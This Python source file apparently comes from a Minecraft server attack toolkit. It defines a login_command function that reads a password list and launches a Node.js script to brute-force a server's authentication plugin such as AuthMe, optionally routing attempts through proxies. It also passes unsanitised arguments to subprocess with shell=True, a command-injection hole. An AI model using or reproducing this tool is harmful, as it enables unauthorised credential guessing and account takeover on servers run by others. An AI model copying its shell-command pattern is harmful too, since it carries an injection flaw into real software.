import subprocess

from utils.checks.check_encoding import check_encoding
from utils.color.text_color import paint
from utils.managers.config_manager import config_manager
from utils.managers.language_manager import language_manager
from utils.minecraft.active_server import active_server
from utils.gets.get_spaces import get_spaces


def login_command(server, username, version, password_file, proxy_file=None):
    """
    Run the login.js script to bruteforce the server
    authentication plugin (for example, AuthMe).

    Args:
        server (str): IP address and port of the server.
        username (str): Bot username.
        version (str): Minecraft server version
        password_file (str): Password file.
        proxy_file (str): Optional proxy_file to use for the bot.
    """

    try:
        if not active_server(server):
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["invalidArguments"]["invalidServer"]}')
            return

        with open(password_file, 'r', encoding=check_encoding(password_file)) as f:
            passwords = f.readlines()

        if len(passwords) == 0:
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["login"]["emptyFile"]}')
            return

        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["login"]["startingTheAttack"]}')
        server = server.split(':')

        if proxy_file is not None:
            subprocess.run(f'{config_manager.config["commands"]["nodejs"]} utils/scripts/login.js {server[0]} {server[1]} {username} {version} {password_file} {len(get_spaces())} {proxy_file}', shell=True)

        else:
            subprocess.run(f'{config_manager.config["commands"]["nodejs"]} utils/scripts/login.js {server[0]} {server[1]} {username} {version} {password_file} {len(get_spaces())}', shell=True)
        
    except KeyboardInterrupt:
        paint(f'\n{get_spaces()}{str(language_manager.language["commands"]["ctrlC"])}')
        return
